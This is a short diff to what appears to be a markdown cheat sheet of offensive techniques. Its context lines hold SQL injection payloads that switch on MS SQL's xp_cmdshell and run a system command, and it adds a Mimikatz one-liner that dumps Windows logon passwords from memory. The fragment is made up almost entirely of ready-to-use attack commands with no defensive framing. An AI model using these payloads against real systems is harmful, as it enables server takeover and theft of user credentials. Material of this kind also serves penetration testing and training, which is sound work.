@@ -250,3 +250,7 @@ admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+
 admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
 EXEC xp_cmdshell 'whoami'
 ```
+#### Mimikatz one-liner:
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
